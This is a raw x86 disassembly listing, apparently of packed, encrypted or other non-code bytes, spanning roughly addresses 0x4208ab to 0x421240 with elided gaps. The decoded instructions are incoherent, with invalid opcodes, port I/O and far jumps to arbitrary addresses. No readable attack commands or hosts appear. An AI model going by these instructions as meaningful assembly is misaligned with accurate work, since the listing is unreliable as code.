  4208ab:	pop    ebx
  4208ac:	and    cl,dh
  4208ae:	sbb    ebx,DWORD PTR [ebx+0x5c]
  4208b1:	xor    ch,bl
  4208b3:	jg     0x420919
  4208b5:	add    al,0xea
  4208b7:	or     eax,0x951a004c
  4208bc:	push   esp
  4208bd:	sbb    DWORD PTR [edx-0x75],eax
  4208c0:	jb     0x4208c8
  4208c2:	in     al,0x78
  4208c4:	popa   
  4208c5:	cmc    
  4208c6:	pop    ebx
  4208c7:	jbe    0x420937
  4208c9:	sar    BYTE PTR ds:0x89cc783d,1
  4208cf:	or     eax,0x95661e7a
  4208d4:	inc    esi
  4208d5:	sbb    BYTE PTR [ebx+0x4c],dl
  4208d8:	xor    BYTE PTR [esp+edi*2],dl
  4208db:	cmp    al,0x46
  4208dd:	sti    
  4208de:	sub    BYTE PTR [edi+0x44],al
  4208e1:	icebp  
  4208e2:	push   ebp
  4208e3:	inc    edx
  4208e4:	aaa    
  4208e5:	sti    
	...
  42090e:	add    BYTE PTR [eax],al
  420910:	xor    ebx,DWORD PTR [ecx+0x4528d82b]
  420916:	cmp    BYTE PTR [edi-0x27c96784],ah
  42091c:	jns    0x4208b9
  42091e:	xor    eax,0x6d9d3d8c
  420923:	jg     0x420981
  420925:	xchg   edi,eax
  420926:	push   esp
  420927:	cdq    
  420928:	sub    esi,DWORD PTR [edi+0x62]
  42092b:	jmp    0x9a909da1
  420930:	sbb    dh,BYTE PTR [edi+0x74]
  420933:	pop    esi
  420934:	sbb    eax,0xe83d638b
  420939:	jg     0x4209b1
  42093b:	dec    eax
  42093c:	clc    
  42093d:	test   al,0x50
  42093f:	jmp    0xa5877f
  420944:	xchg   dl,bh
  420946:	pop    edi
  420947:	outs   dx,DWORD PTR ds:[esi]
  420948:	push   edx
  420949:	sub    eax,0xf8240071
  42094e:	push   0x58e774
  420953:	add    bh,ah
  420955:	pop    eax
  420956:	add    BYTE PTR [eax],al
  420958:	xlat   BYTE PTR ds:[ebx]
  420959:	add    BYTE PTR ds:[eax+edi*8],bh
  42095d:	pop    eax
  42095e:	cmp    al,0x50
  420960:	cmp    BYTE PTR [edi],ah
  420962:	xor    BYTE PTR [edi+0x37],bl
  420965:	clc    
  420966:	outs   dx,DWORD PTR ds:[esi]
  420967:	jae    0x420939
  420969:	das    
  42096a:	outs   dx,DWORD PTR ds:[esi]
  42096b:	test   DWORD PTR fs:[eax+0x3c],ebx
  42096f:	push   ebx
  420970:	pop    edx
  420971:	xor    ecx,DWORD PTR [ebp+0x5f]
	...
  42099c:	add    BYTE PTR [eax],al
  42099e:	idiv   ecx
  4209a0:	outs   dx,DWORD PTR ds:[esi]
  4209a1:	jae    0x420933
  4209a3:	das    
  4209a4:	outs   dx,DWORD PTR ds:[esi]
  4209a5:	fs inc ebp
  4209a7:	push   edi
  4209a8:	cmp    al,0x49
  4209aa:	mov    edx,0xb75f4d19
  4209af:	stc    
  4209b0:	outs   dx,DWORD PTR ds:[esi]
  4209b1:	jae    0x420983
  4209b3:	das    
  4209b4:	outs   dx,DWORD PTR ds:[esi]
  4209b5:	test   DWORD PTR fs:[eax+0x3c],ebx
  4209b9:	dec    eax
  4209ba:	shl    DWORD PTR [ecx*2+0x6931c64d],cl
  4209c1:	pop    edi
  4209c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209c3:	stc    
  4209c4:	outs   dx,DWORD PTR ds:[esi]
  4209c5:	jae    0x420987
  4209c7:	das    
  4209c8:	outs   dx,DWORD PTR ds:[esi]
  4209c9:	fs jne 0x420a24
  4209cc:	add    BYTE PTR [edx+ecx*4+0x31],bl
  4209d0:	pusha  
  4209d1:	jb     0x42098b
  4209d3:	or     ebp,DWORD PTR [esi+eiz*2-0x3d]
  4209d7:	sbb    edx,DWORD PTR [ecx+ebp*2-0x47]
  4209db:	hlt    
  4209dc:	imul   esi,DWORD PTR [edi-0x6c],0x37
  4209e0:	dec    esp
  4209e1:	imul   edx,DWORD PTR [ecx+0x3e4d1cfa],0x3e6bdba3
  4209eb:	push   ecx
  4209ec:	fldenv [ebp-0x76]
  4209ef:	dec    ebp
  4209f0:	jecxz  0x420a63
  4209f2:	mov    ds:0x9d66b76e,eax
  4209f7:	push   eax
  4209f8:	fnstenv [eax+0x69]
  4209fb:	xchg   esp,eax
  4209fc:	lock pop ebx
  4209fe:	mov    DWORD PTR [ebx-0x26],ebp
  420a01:	arpl   WORD PTR [eax],ax
	...
  420a2b:	add    BYTE PTR [ecx+0x65],bl
  420a2e:	cmc    
  420a2f:	pop    ds
  420a30:	jb     0x420a8d
  420a32:	repnz bound ebx,QWORD PTR [esi]
  420a35:	outs   dx,DWORD PTR ds:[esi]
  420a36:	jecxz  0x420a9e
  420a38:	bound  eax,QWORD PTR [edx]
  420a3a:	lds    ecx,FWORD PTR [edx+0x57]
  420a3d:	popa   
  420a3e:	imul   BYTE PTR [ebp+ecx*2+0x55]
  420a42:	loop   0x420ab7
  420a44:	sbb    ah,BYTE PTR [ebp-0x25]
  420a47:	ins    DWORD PTR es:[edi],dx
  420a48:	sbb    ah,BYTE PTR ds:0xbf5e70f2
  420a4e:	jecxz  0x420ab6
  420a50:	adc    al,BYTE PTR [edx]
  420a52:	(bad)  
  420a53:	ins    BYTE PTR es:[edi],dx
  420a54:	and    BYTE PTR [esi],ah
  420a56:	repnz pop esi
  420a58:	or     al,0x1f
  420a5a:	lds    ecx,FWORD PTR [edx+0x17]
  420a5d:	and    ebx,esi
  420a5f:	ins    BYTE PTR es:[edi],dx
  420a60:	or     eax,0x1a73df15
  420a65:	in     eax,0xdb
  420a67:	ins    DWORD PTR es:[edi],dx
  420a68:	(bad)  
  420a6a:	icebp  
  420a6b:	jo     0x420a8b
  420a6d:	mov    edi,0x1d266e3
  420a72:	(bad)  
  420a73:	ins    BYTE PTR es:[edi],dx
  420a74:	loopne 0x420a5b
  420a76:	icebp  
  420a77:	pop    esi
  420a78:	int3   
  420a79:	faddp  st(4),st
  420a7b:	push   ecx
  420a7c:	xlat   BYTE PTR ds:[ebx]
  420a7d:	faddp  st(3),st
  420a7f:	jno    0x420a4b
  420a81:	nop
  420a82:	lds    eax,FWORD PTR [ecx+0x6c]
  420a85:	fcom   st(5)
  420a87:	bound  ebp,QWORD PTR [edx-0x6422a4a5]
  420a8d:	sbb    BYTE PTR [edx+0x4],0x0
	...
  420ab9:	add    BYTE PTR [edx+0x7c],bh
  420abc:	pop    ebx
  420abd:	in     eax,0x7d
  420abf:	je     0x420b1a
  420ac1:	add    al,0x7a
  420ac3:	jl     0x420b00
  420ac5:	in     eax,0x7d
  420ac7:	je     0x420b02
  420ac9:	(bad)  
  420aca:	pusha  
  420acb:	jbe    0x420ab4
  420acd:	mov    eax,0xe63b7498
  420ad2:	bound  eax,QWORD PTR [ebx+0x745bdcd5]
  420ad8:	out    0xd6,eax
  420ada:	push   edx
  420adb:	sbb    DWORD PTR [ebx],0x48d78f3
  420ae1:	enter  0x7a81,0xa
  420ae5:	fld    TBYTE PTR [ecx]
  420ae7:	scas   al,BYTE PTR es:[edi]
  420ae8:	add    bh,dh
  420aea:	dec    ebp
  420aeb:	add    BYTE PTR [edi+esi*8],0x59
  420aef:	xchg   esp,eax
  420af0:	std    
  420af1:	out    0xb1,al
  420af3:	call   0xd3bb:0x5b21efc8
  420afa:	adc    bh,BYTE PTR [esi-0x3a]
  420afd:	(bad)  
  420afe:	adc    BYTE PTR [esi+0x3924e0d3],cl
  420b04:	rcr    cl,1
  420b06:	and    BYTE PTR [ebx-0x69],bl
  420b09:	cmc    
  420b0a:	adc    al,BYTE PTR [edx+0x5ae4e4b9]
  420b10:	mov    ds:0xb77bede4,eax
  420b15:	in     al,0xed
  420b17:	jb     0x420b00
  420b19:	in     al,0xde
  420b1b:	jge    0x420aa3
  420b1d:	lock add BYTE PTR [eax],al
	...
  420b48:	jmp    0x420ad8
  420b4a:	call   0xea03:0x9078d919
  420b51:	stos   BYTE PTR es:[edi],al
  420b52:	mov    fs,esi
  420b54:	shl    BYTE PTR [edi+0x0],cl
  420b57:	mov    BYTE PTR [edx],bl
  420b59:	jbe    0x420b5b
  420b5b:	call   0x8c1d:0x5e748014
  420b62:	arpl   WORD PTR ds:0x5b6177e5,di
  420b68:	stc    
  420b69:	jge    0x420bd2
  420b6b:	sbb    al,0x1d
  420b6d:	sub    DWORD PTR [ecx+ebp*8-0x38],0xe6505f74
  420b75:	dec    eax
  420b76:	fs dec ebp
  420b78:	lock jl 0x420bec
  420b7b:	cmp    bh,BYTE PTR [edx]
  420b7d:	scas   eax,DWORD PTR es:[edi]
  420b7e:	arpl   WORD PTR [edx],cx
  420b80:	or     bh,BYTE PTR [eax+0x6d]
  420b83:	or     eax,0xe9777f07
  420b88:	in     eax,dx
  420b89:	jbe    0x420bfb
  420b8b:	cmp    dh,cl
  420b8d:	mov    esi,DWORD PTR [esi+0xc]
  420b90:	ror    BYTE PTR [ecx],1
  420b92:	dec    ebp
  420b93:	push   cs
  420b94:	retf   0x6d99
  420b97:	sti    
  420b98:	test   eax,0xadfe4d09
  420b9d:	dec    eax
  420b9e:	popa   
  420b9f:	retf   0x8c86
  420ba2:	outs   dx,BYTE PTR ds:[esi]
  420ba3:	aad    0x3d
  420ba5:	stos   DWORD PTR es:[edi],eax
  420ba6:	ins    DWORD PTR es:[edi],dx
  420ba7:	fldcw  WORD PTR [ebp-0x58]
  420baa:	jno    0x420b86
	...
  420bd4:	add    BYTE PTR [eax],al
  420bd6:	mov    ?,WORD PTR [esi+0x72]
  420bd9:	int    0x3d
  420bdb:	lods   al,BYTE PTR ds:[esi]
  420bdc:	imul   esi,DWORD PTR [ebp-0x449c5573],0x6f
  420be3:	jl     0x420c57
  420be5:	jmp    0x99b68074
  420bea:	lea    esi,[esi+0x72]
  420bed:	xchg   ebp,eax
  420bee:	cmp    eax,0x4d9d6bac
  420bf3:	dec    eax
  420bf4:	popa   
  420bf5:	mov    dh,BYTE PTR [esi-0x74]
  420bf8:	outs   dx,BYTE PTR ds:[esi]
  420bf9:	add    bl,cl
  420bfb:	pop    ebp
  420bfc:	dec    edi
  420bfd:	ins    DWORD PTR es:[edi],dx
  420bfe:	retf   
  420bff:	or     eax,0xfb4614d
  420c04:	je     0x420c75
  420c06:	mov    ch,0x28
  420c08:	std    
  420c09:	pusha  
  420c0a:	je     0x420c0a
  420c0c:	imul   esi,DWORD PTR [ebp+0x71],0xb
  420c10:	sub    esp,DWORD PTR [ebx-0x77]
  420c13:	cli    
  420c14:	cld    
  420c15:	pusha  
  420c16:	test   dh,bh
  420c18:	imul   esi,DWORD PTR [ebp+0x71],0xb
  420c1c:	sub    esp,DWORD PTR [ebx+0x79]
  420c1f:	and    eax,0xfc255bfd
  420c24:	jo     0x420c73
  420c26:	xchg   BYTE PTR [ecx+ebp*2],ah
  420c29:	add    BYTE PTR [ebx-0x89a9ad5],al
  420c2f:	push   ds
  420c30:	pop    esi
  420c31:	je     0x420c39
  420c33:	pop    ebp
  420c34:	dec    edi
  420c35:	outs   dx,DWORD PTR ds:[esi]
  420c36:	cmp    DWORD PTR [ebx],ecx
  420c38:	je     0x420c9b
	...
  420c62:	add    BYTE PTR [eax],al
  420c64:	lds    ebp,FWORD PTR [ecx]
  420c66:	pop    ecx
  420c67:	push   edx
  420c68:	push   cs
  420c69:	sub    ebx,DWORD PTR [ecx+0x54]
  420c6c:	aas    
  420c6d:	sub    BYTE PTR ds:0x1e0b4642,bl
  420c73:	add    ah,ah
  420c75:	and    esp,DWORD PTR [ebx+0x74]
  420c78:	mov    ch,bh
  420c7a:	outs   dx,BYTE PTR ds:[esi]
  420c7b:	shr    DWORD PTR gs:[esi],cl
  420c7e:	inc    esi
  420c7f:	push   esp
  420c80:	jecxz  0x420c9a
  420c82:	gs gs aaa 
  420c85:	and    DWORD PTR [esi+0x74],ebx
  420c88:	adc    edx,DWORD PTR ss:[edx+0x73]
  420c8c:	mov    cl,BYTE PTR [esi]
  420c8e:	jo     0x420cb0
  420c90:	jnp    0x420cbb
  420c92:	ins    DWORD PTR es:[edi],dx
  420c93:	outs   dx,DWORD PTR ds:[esi]
  420c94:	retf   
  420c95:	pop    esp
  420c96:	push   ebx
  420c97:	outs   dx,DWORD PTR ds:[esi]
  420c98:	lds    esp,FWORD PTR [edi]
  420c9a:	data16 outs dx,BYTE PTR ds:[esi]
  420c9c:	fldenv ds:[eax]
  420c9f:	inc    esp
  420ca0:	out    0xe3,eax
  420ca2:	frstor [eax-0x2e]
  420ca5:	lock bnd jbe 0x420ce7
  420ca9:	loop   0x420c9d
  420cab:	ins    BYTE PTR es:[edi],dx
  420cac:	mov    eax,ds:0x7a6ae284
  420cb1:	fcomi  st,st(2)
  420cb3:	(bad)  
  420cb4:	jl     0x420c67
  420cb6:	out    dx,eax
  420cb7:	ins    DWORD PTR es:[edi],dx
  420cb8:	stos   BYTE PTR es:[edi],al
  420cb9:	repnz mov esp,0xef93a062
  420cbf:	imul   ecx,DWORD PTR [edx-0x7399430e],0x52
  420cc6:	and    DWORD PTR [ebx],esp
	...
  420cf0:	add    BYTE PTR [eax],al
  420cf2:	call   0x2462:0x924ad1f2
  420cf9:	inc    ebx
  420cfa:	arpl   WORD PTR [ebx+0x331e6bdb],dx
  420d00:	loopne 0x420d65
  420d02:	ins    BYTE PTR es:[edi],dx
  420d03:	pop    edi
  420d04:	icebp  
  420d05:	jo     0x420d45
  420d07:	inc    ebp
  420d08:	mov    bh,0x53
  420d0a:	outs   dx,BYTE PTR ds:[esi]
  420d0b:	adc    dl,dl
  420d0d:	bound  ecx,QWORD PTR [eax+ecx*1-0x20]
  420d11:	jno    0x420d51
  420d13:	bound  esi,QWORD PTR [ebp-0x2ded92b1]
  420d19:	bound  ebp,QWORD PTR [eax+edx*1]
  420d1c:	loopne 0x420d8f
  420d1e:	ds ret 0x4fb5
  420d22:	ins    DWORD PTR es:[edi],dx
  420d23:	push   edx
  420d24:	iret   
  420d25:	jo     0x420d4a
  420d27:	and    al,0x21
  420d29:	dec    esi
  420d2a:	pop    ds
  420d2b:	(bad)  
  420d2c:	(bad)  
  420d2e:	in     al,dx
  420d2f:	into   
  420d30:	int3   
  420d31:	dec    edi
  420d32:	pop    esi
  420d33:	out    dx,eax
  420d34:	icebp  
  420d35:	(bad)  
  420d36:	in     al,dx
  420d37:	push   ecx
  420d38:	mov    dh,0x5e
  420d3a:	jecxz  0x420d5a
  420d3c:	add    DWORD PTR [esi-0x8],ecx
  420d3f:	pop    edx
  420d40:	mov    ebx,0x8c9e41d3
  420d45:	in     al,0xe0
  420d47:	jbe    0x420d10
  420d49:	(bad)  
  420d4a:	fnstsw WORD PTR [esi-0x67]
  420d4d:	loopne 0x420d1d
  420d4f:	mov    esp,edi
  420d51:	mov    ch,0xf3
  420d53:	scas   al,BYTE PTR es:[edi]
  420d54:	xchg   edi,eax
  420d55:	and    eax,DWORD PTR [eax]
	...
  420d7f:	add    BYTE PTR [ebp+0x51f18c8a],cl
  420d85:	xchg   ebp,eax
  420d86:	mov    al,bl
  420d88:	pushf  
  420d89:	pop    ebx
  420d8a:	xor    eax,0x7ab8db6
  420d8f:	rcr    DWORD PTR [ecx+ecx*4+0x5b8fe15d],cl
  420d96:	and    BYTE PTR [ecx-0x2cf854b8],bh
  420d9c:	pushf  
  420d9d:	mov    DWORD PTR ds:0x205b6fe1,esi
  420da3:	mov    ecx,0xd107ab30
  420da8:	outs   dx,BYTE PTR ds:[esi]
  420da9:	sbb    BYTE PTR [ecx],0x24
  420dac:	jo     0x420e2a
  420dae:	or     al,0xe1
  420db0:	fstp   DWORD PTR [edi+0x7758e504]
  420db6:	out    0xbb,eax
  420db8:	ins    DWORD PTR es:[edi],dx
  420db9:	scas   eax,DWORD PTR es:[edi]
  420dba:	pop    ss
  420dbb:	and    al,0x6d
  420dbd:	mov    al,BYTE PTR [edx+esi*8]
  420dc0:	mov    ecx,0x1d01b9e
  420dc5:	cmp    ebx,DWORD PTR [edx]
  420dc7:	loope  0x420df8
  420dc9:	(bad)  
  420dca:	int3   
  420dcb:	icebp  
  420dcc:	inc    ecx
  420dcd:	mov    al,0xb9
  420dcf:	mov    bh,0x99
  420dd1:	xchg   esi,eax
  420dd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420dd3:	ror    DWORD PTR [esi+0x3b],cl
  420dd6:	mov    ah,0xf2
  420dd8:	sbb    al,0x89
  420dda:	out    0xbc,eax
  420ddc:	hlt    
  420ddd:	fwait
  420dde:	xchg   edi,eax
  420ddf:	and    ecx,DWORD PTR ds:0xcc008a
	...
  420e0d:	add    BYTE PTR [edi+0x6],ch
  420e10:	inc    ebp
  420e11:	xchg   ebp,eax
  420e12:	jns    0x420daa
  420e14:	dec    ebx
  420e15:	mov    BYTE PTR [edx+0x4cb42072],al
  420e1b:	jns    0x420e8f
  420e1d:	leave  
  420e1e:	mov    esp,DWORD PTR [ebp-0x6cc27b95]
  420e24:	push   esp
  420e25:	popf   
  420e26:	ins    DWORD PTR es:[edi],dx
  420e27:	xchg   ecx,eax
  420e28:	pop    edi
  420e29:	nop
  420e2a:	adc    DWORD PTR [esi+0x51],esp
  420e2d:	mov    WORD PTR [edi],gs
  420e2f:	nop
  420e30:	arpl   WORD PTR [ebx+0x3d],di
  420e33:	lods   al,BYTE PTR ds:[esi]
  420e34:	dec    ebx
  420e35:	cmp    eax,0x5a53660a
  420e3a:	stc    
  420e3b:	mov    eax,DWORD PTR [eax]
  420e3d:	jmp    0x1a92a52f
  420e42:	bound  ebp,QWORD PTR [ebx+0x60e3b6d]
  420e48:	push   edx
  420e49:	sub    al,0xe
  420e4b:	xchg   esi,eax
  420e4c:	and    BYTE PTR [ecx],bl
  420e4e:	or     ecx,DWORD PTR [esp+esi*2+0x3f90a4e9]
  420e55:	cmp    DWORD PTR [edx],ebx
  420e57:	stos   DWORD PTR es:[edi],eax
  420e58:	ins    DWORD PTR es:[edi],dx
  420e59:	sbb    ecx,esi
  420e5b:	add    eax,0x958b39fd
  420e60:	xor    ecx,ecx
  420e62:	in     eax,dx
  420e63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e64:	jno    0x420e60
  420e66:	shl    BYTE PTR [esi+0x72],cl
  420e69:	add    eax,0x24475b6c
  420e6e:	jge    0x420e05
  420e70:	and    BYTE PTR [ecx],bl
	...
  420e9a:	add    BYTE PTR [eax],al
  420e9c:	popf   
  420e9d:	mov    dh,BYTE PTR [ecx-0x22]
  420ea0:	mov    cl,BYTE PTR [ebx-0x6abde49c]
  420ea6:	dec    esi
  420ea7:	mov    ebp,0xc850656d
  420eac:	mov    cs,WORD PTR [edx+0xb680075]
  420eb2:	popa   
  420eb3:	xor    ah,BYTE PTR [edi-0x3f]
  420eb6:	push   eax
  420eb7:	push   esp
  420eb8:	xlat   BYTE PTR ds:[ebx]
  420eb9:	int3   
  420eba:	pop    ebp
  420ebb:	imul   ebp,DWORD PTR [ebx-0x3b9eafc7],0xb56f740a
  420ec5:	and    eax,0xcc94002f
  420eca:	push   eax
  420ecb:	push   eax
  420ecc:	ja     0x420ef7
  420ece:	pop    esi
  420ecf:	jae    0x420e95
  420ed1:	imul   BYTE PTR [ebx+0x72]
  420ed4:	ret    
  420ed5:	dec    edx
  420ed6:	add    BYTE PTR [eax],al
  420ed8:	xlat   BYTE PTR ds:[ebx]
  420ed9:	iret   
  420eda:	dec    esp
  420edb:	xor    esi,edi
  420edd:	sub    BYTE PTR [esi+0x73],bl
  420ee0:	test   dh,dh
  420ee2:	imul   esi,DWORD PTR [edx-0x7d],0x5f
  420ee6:	inc    ebp
  420ee7:	dec    ebp
  420ee8:	data16 das 
  420eea:	sbb    eax,0x700a7650
  420eef:	ja     0x420f59
  420ef1:	or     DWORD PTR [ecx+0x0],esp
  420ef4:	sub    ebp,ecx
  420ef6:	push   eax
  420ef7:	push   eax
  420ef8:	inc    edi
  420ef9:	das    
  420efa:	pop    esi
  420efb:	jae    0x420f21
  420efd:	imul   BYTE PTR [ebx+0x72]
	...
  420f28:	add    BYTE PTR [eax],al
  420f2a:	xor    ebx,DWORD PTR [edi+0x48]
  420f2d:	push   esp
  420f2e:	adc    ebp,DWORD PTR [edi]
  420f30:	sbb    eax,0x700a4650
  420f35:	ja     0x420eff
  420f37:	or     ah,BYTE PTR [ecx+0x0]
  420f3a:	and    al,0xcc
  420f3c:	push   eax
  420f3d:	push   eax
  420f3e:	xchg   DWORD PTR [eax],ebp
  420f40:	pop    esi
  420f41:	jae    0x420ef7
  420f43:	imul   DWORD PTR [ebx+0x72]
  420f46:	inc    ebx
  420f47:	pop    edi
  420f48:	add    BYTE PTR [ebx-0x78],dl
  420f4b:	es jno 0x420fc5
  420f4e:	xchg   BYTE PTR [edx],cl
  420f50:	bound  ebx,QWORD PTR [esi+edi*1-0x41]
  420f54:	fldenv [eax+0xc]
  420f57:	(bad)
  420f5a:	sbb    dh,al
  420f5c:	les    eax,FWORD PTR [esi-0x18]
  420f5f:	int    0xdd
  420f61:	jno    0x420f43
  420f63:	push   ss
  420f64:	in     eax,dx
  420f65:	pop    ds
  420f66:	call   DWORD PTR [eax]
  420f68:	loopne 0x420fd6
  420f6a:	jmp    0x420f57
  420f6c:	in     al,dx
  420f6d:	pop    ds
  420f6e:	or     edx,ebx
  420f70:	rcr    BYTE PTR [esi-0x27],cl
  420f73:	(bad)  
  420f74:	out    dx,al
  420f75:	pop    ebx
  420f76:	call   eax
  420f78:	fild   QWORD PTR [ebx+ecx*8-0x15]
  420f7c:	in     al,dx
  420f7d:	jo     0x420fbd
  420f7f:	retf   
  420f80:	fsub   QWORD PTR [edx-0x60]
  420f83:	xchg   dl,bl
  420f85:	jae    0x420f1e
  420f87:	fucomip st,st(7)
  420f89:	dec    DWORD PTR [ebp+ebp*4+0x73ea]
	...
  420fb8:	xchg   ecx,eax
  420fb9:	xchg   ebx,eax
  420fba:	(bad)  
  420fbb:	bound  esi,QWORD PTR [edx+0x3f]
  420fbe:	jmp    0x421020
  420fc0:	mov    WORD PTR [ebp-0x2b],es
  420fc3:	ins    BYTE PTR es:[edi],dx
  420fc4:	cwde   
  420fc5:	inc    esi
  420fc6:	ror    BYTE PTR [eax+eiz*2-0x64],0xeb
  420fcb:	pusha  
  420fcc:	pop    ebx
  420fcd:	outs   dx,BYTE PTR ds:[esi]
  420fce:	shl    DWORD PTR [edx+0x72],1
  420fd1:	inc    esi
  420fd2:	icebp  
  420fd3:	ins    BYTE PTR es:[edi],dx
  420fd4:	push   ebp
  420fd5:	sahf   
  420fd6:	ror    DWORD PTR [edx-0x79],1
  420fd9:	adc    al,ah
  420fdb:	pusha  
  420fdc:	pop    ebp
  420fdd:	pop    ebp
  420fde:	xlat   BYTE PTR ds:[ebx]
  420fdf:	ins    DWORD PTR es:[edi],dx
  420fe0:	push   edx
  420fe1:	adc    dl,al
  420fe3:	pop    esi
  420fe4:	push   eax
  420fe5:	push   ebx
  420fe6:	jmp    0xc3a83c4d
  420feb:	pusha  
  420fec:	sbb    eax,0x326dd75d
  420ff1:	add    DWORD PTR [ecx],eax
  420ff3:	push   ecx
  420ff4:	adc    DWORD PTR [ebx-0x33],ebx
  420ff7:	xlat   BYTE PTR ds:[ebx]
  420ff8:	adc    bh,BYTE PTR [edx-0x27]
  420ffb:	call   0xe702a5f5
  421000:	pcmpeqb mm3,mm2
  421003:	repnz sbb ecx,DWORD PTR [edi+0x74e0baa3]
  42100a:	ret    
  42100b:	repnz jmp 0xaaa7:0xdd20787
  421013:	fsubr  st,st(7)
  421015:	mov    BYTE PTR [ecx+esi*8-0x2a7b5333],cl
	...
  421044:	add    BYTE PTR [eax],al
  421046:	into   
  421047:	jno    0x420fcf
  421049:	icebp  
  42104a:	in     eax,0xab
  42104c:	xor    cl,0xdd
  42104f:	jae    0x4210cf
  421051:	(bad)  
  421052:	pop    ecx
  421053:	nop
  421054:	test   dh,dl
  421056:	scas   al,BYTE PTR es:[edi]
  421057:	jl     0x420fe7
  421059:	in     al,dx
  42105a:	fwait
  42105b:	jp     0x421024
  42105d:	mov    dh,0xac
  42105f:	jge    0x4210bb
  421061:	fisttp QWORD PTR [esi+0x75f14487]
  421067:	stos   DWORD PTR es:[edi],eax
  421068:	pop    ecx
  421069:	repz mov ds:0x8ee93b74,eax
  42106f:	lahf   
  421070:	xor    al,0xed
  421072:	pop    esi
  421073:	lea    ecx,[esi-0x29]
  421076:	bound  edi,QWORD PTR [ecx+0x3b]
  421079:	and    al,0x7b
  42107b:	mov    BYTE PTR [ebx],dh
  42107d:	lock push edx
  42107f:	jb     0x421093
  421081:	and    al,0x81
  421083:	jno    0x421098
  421085:	jmp    0xd84e81d9
  42108a:	sub    DWORD PTR [esi+0x744dd804],ebp
  421090:	adc    eax,0x1a5b2eeb
  421095:	repz sbb eax,DWORD PTR [edi-0x735d0200]
  42109c:	arpl   WORD PTR ds:0xdb61798f,cx
  4210a2:	mov    WORD PTR [ebx-0x59963893],cs
  4210a8:	push   ebp
  4210a9:	rol    BYTE PTR [eax],0x0
	...
  4210d4:	(bad)  
  4210d5:	jle    0x421144
  4210d7:	(bad)  
  4210d8:	push   0xb99d4e62
  4210dd:	fwait
  4210de:	jae    0x42109b
  4210e0:	mov    edi,DWORD PTR [ebp+0x6e]
  4210e3:	mov    ebp,0xba727da7
  4210e8:	push   edx
  4210e9:	outs   dx,DWORD PTR ds:[esi]
  4210ea:	outs   dx,BYTE PTR ds:[esi]
  4210eb:	lds    edx,FWORD PTR [ecx+edi*2-0x78b37a92]
  4210f2:	jno    0x4210bd
  4210f4:	outs   dx,BYTE PTR ds:[esi]
  4210f5:	jge    0x421168
  4210f7:	call   0x6224:0x9767775a
  4210fe:	push   ecx
  4210ff:	je     0x42111c
  421101:	mov    esi,DWORD PTR [edi+0x7a]
  421104:	adc    DWORD PTR [ebp+0x6b],edi
  421107:	(bad)  
  421108:	in     eax,dx
  421109:	mov    ebp,DWORD PTR [ebp+0x4f]
  42110c:	and    eax,0xfe5a6376
  421111:	mov    ?,WORD PTR [ebx+0x5d]
  421114:	push   cs
  421115:	outs   dx,DWORD PTR ds:[esi]
  421116:	ins    DWORD PTR es:[edi],dx
  421117:	inc    edx
  421118:	cmp    ch,BYTE PTR [ebp+ebp*2+0x5f87164f]
  42111f:	cmp    ebx,ecx
  421121:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421122:	dec    ebx
  421123:	inc    eax
  421124:	jecxz  0x4210b1
  421126:	ins    DWORD PTR es:[edi],dx
  421127:	cmp    ch,bh
  421129:	ja     0x42119f
  42112b:	inc    ebp
  42112c:	add    eax,0xe8047470
  421131:	outs   dx,DWORD PTR ds:[esi]
  421132:	arpl   WORD PTR ds:0xa614222,bx
	...
  421160:	add    BYTE PTR [eax],al
  421162:	iret   
  421163:	mov    WORD PTR [esi+0x0],gs
  421166:	mov    ebx,0x4161493d
  42116b:	(bad)  
  42116c:	arpl   WORD PTR [ebp-0x5b],sp
  42116f:	pop    ebp
  421170:	dec    ebx
  421171:	jne    0x42111e
  421173:	icebp  
  421174:	imul   ebp,DWORD PTR [edi+0x6c],0x5d
  421178:	pop    esp
  421179:	inc    ecx
  42117a:	test   dh,dh
  42117c:	imul   esi,DWORD PTR [ebp-0x7f],0x29
  421180:	jo     0x421182
  421182:	jle    0x42117d
  421184:	popa   
  421185:	outs   dx,BYTE PTR ds:[esi]
  421186:	mov    ebx,0x846962f4
  42118b:	cld    
  42118c:	jo     0x4211f7
  42118e:	or     BYTE PTR [ebx],0xfd
  421191:	push   0x746af87b
  421196:	scas   al,BYTE PTR es:[edi]
  421197:	sub    DWORD PTR [esi+0x6d],esi
  42119a:	mov    eax,0xc168fd27
  42119f:	clc    
  4211a0:	jo     0x421205
  4211a2:	shl    al,0x69
  4211a5:	and    BYTE PTR [ecx+edi*8+0x26ba766e],dh
  4211ac:	sbb    eax,0x7027b670
  4211b1:	ja     0x421153
  4211b3:	es popa 
  4211b5:	jae    0x4211de
  4211b7:	or     al,0x72
  4211b9:	je     0x42113e
  4211bb:	or     ch,BYTE PTR [ebx+ebp*2+0x37]
  4211bf:	cld    
  4211c0:	pop    edi
  4211c1:	arpl   WORD PTR [eax+0x28],ax
  4211c4:	imul   esi,DWORD PTR [eax+eax*1+0x0],0x0
	...
  4211ed:	add    BYTE PTR [eax],al
  4211ef:	add    BYTE PTR [edi-0x10],al
  4211f2:	pop    ebp
  4211f3:	outs   dx,BYTE PTR ds:[esi]
  4211f4:	xchg   dl,dh
  4211f6:	popa   
  4211f7:	jb     0x421230
  4211f9:	daa    
  4211fa:	pop    esi
  4211fb:	jae    0x421221
  4211fd:	and    ch,BYTE PTR [edx+esi*2+0x4b]
  421201:	es std 
  421203:	push   0x746af83b
  421208:	ds pop ebx
  42120a:	fsub   DWORD PTR [esi+0x5b]
  42120d:	gs add al,0x79
  421210:	arpl   dx,ax
  421212:	sbb    BYTE PTR [eax+0x63],bl
  421215:	pop    ss
  421216:	adc    DWORD PTR [esi+eax*1],esi
  421219:	pop    ss
  42121a:	xor    BYTE PTR es:[edx+0x6a],ch
  42121e:	sub    eax,0xbc644e23
  421223:	and    cl,BYTE PTR [esi+0x64]
  421226:	mov    esp,0x1662632a
  42122b:	pop    eax
  42122c:	pop    ebx
  42122d:	bound  edx,QWORD PTR [esi]
  42122f:	pop    eax
  421230:	and    eax,DWORD PTR [edx]
  421232:	adc    ebx,DWORD PTR [eax+0x1b]
  421235:	add    dl,BYTE PTR [ebx]
  421237:	pop    eax
  421238:	and    eax,DWORD PTR [edx]
  42123a:	adc    ebx,DWORD PTR [eax+0x1b]
  42123d:	add    dl,BYTE PTR [ebx]
  42123f:	pop    eax
  421240:	fcomi  st,st(1)
